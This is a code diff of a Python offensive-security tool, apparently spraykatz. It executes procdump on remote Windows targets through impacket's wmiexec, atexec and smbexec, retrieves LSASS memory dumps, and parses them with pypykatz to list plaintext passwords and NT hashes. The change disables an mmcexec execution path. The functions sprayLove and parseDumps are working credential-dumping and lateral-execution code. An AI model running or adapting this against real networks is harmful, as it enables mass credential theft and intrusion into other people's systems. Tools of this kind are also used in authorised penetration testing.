@@ -7,8 +7,6 @@
 # LinkedIn:	https://www.linkedin.com/in/lydericlefebvre
 
 
-from __future__ import print_function
-from gevent.pywsgi import WSGIServer
 import os, sys
 
 homeDir = os.path.dirname(os.path.realpath(__file__))
@@ -34,7 +32,7 @@ from pypykatz.pypykatz import pypykatz
 from helpers import invoke_checklocaladminaccess
 from impacket.smb import SMB_DIALECT
 from impacket.smbconnection import SMBConnection, SessionError
-import wmiexec, mmcexec, atexec, smbexec
+import wmiexec, atexec, smbexec
 
 
 # Colors
@@ -59,7 +57,7 @@ class MyParser(argparse.ArgumentParser):
 		sys.stderr.write("\n%s[-] %sError: %s\n" % (red, white, message))
 		sys.exit(2)
 
-
+		
 class connection:
 	def __init__(self, domain, username, password):
 		self.domain = domain
@@ -180,7 +178,7 @@ def listPwnableTargets(args_targets, conn):
 def sprayLove(conn, targets, methods, share):
 	print ("%s[+] %sExec procdump on targets, and retrieve dumps locally into %smisc/dumps%s." % (green, white, green, white))
 
-	if not methods : methods = ['wmiexec', 'mmcexec', 'atexec', 'smbexec']
+	if not methods : methods = ['wmiexec', 'atexec', 'smbexec']
 	smb_share_name = ''.join(random.sample(string.ascii_letters, 5))
 
 	for target in targets:
@@ -200,14 +198,17 @@ def sprayLove(conn, targets, methods, share):
 						print("%s[~]%s   %s: %swmiexec%s seems to be an %sKO%s method." % (yellow, white, target, red, white, red, white))
 						continue
 
-				elif method == 'mmcexec':
-					try:
-						exec_method = mmcexec.MMCEXEC(target, smb_share_name, conn.username, conn.password, conn.domain, conn.connect, conn.lmhash + ':' + conn.nthash)
-						print("%s[~]%s   %s: %smmcexec%s seems to be an %sOK%s method. let's go... " % (yellow, white, target, green, white, green, white))
-						break
-					except:
-						print("%s[~]%s   %s: %smmcexec%s seems to be an %sKO%s method." % (yellow, white, target, red, white, red, white))
-						continue
+					'''
+					TODO
+					elif method == 'mmcexec':
+						try:
+							exec_method = mmcexec.MMCEXEC(target, smb_share_name, conn.username, conn.password, conn.domain, conn.connect, conn.lmhash + ':' + conn.nthash)
+							print("%s[~]%s   %s: %smmcexec%s seems to be an %sOK%s method. let's go... " % (yellow, white, target, green, white, green, white))
+							break
+						except:
+							print("%s[~]%s   %s: %smmcexec%s seems to be an %sKO%s method." % (yellow, white, target, red, white, red, white))
+							continue
+					'''
 
 				elif method == 'atexec':
 					try:
@@ -231,7 +232,6 @@ def sprayLove(conn, targets, methods, share):
 
 		else:
 			print("%s[-]%s   %s: %sFailed to create a SMB Connection. Aborting." % (red, white, target, red, white))
-
 
 
 def skip_duplicates(iterable, key=lambda x: x):
@@ -260,7 +260,6 @@ def parseDumps(dumpFolder):
 		except:
 			print("%s[-]%s   Parsing %sfailed%s on %s%s%s." % (red, white, red, white, red, filename, white))
 
-	
 	for result in results:
 		for luid in results[result].logon_sessions:
 			dico = results[result].logon_sessions[luid].to_dict()
@@ -292,10 +291,8 @@ def parseDumps(dumpFolder):
 				if cred.password and "TBAL" not in cred.password:
 					credentials.append((cred.username, cred.domainname, cred.password, 'NA', 'NA'))
 
-	
 	credentials = list(skip_duplicates(credentials))
 		
-
 	print ("%s[+]%s Following %scredentials%s were retrieved:" % (green, white, green, white))
 	for credential in credentials:
 			print("")
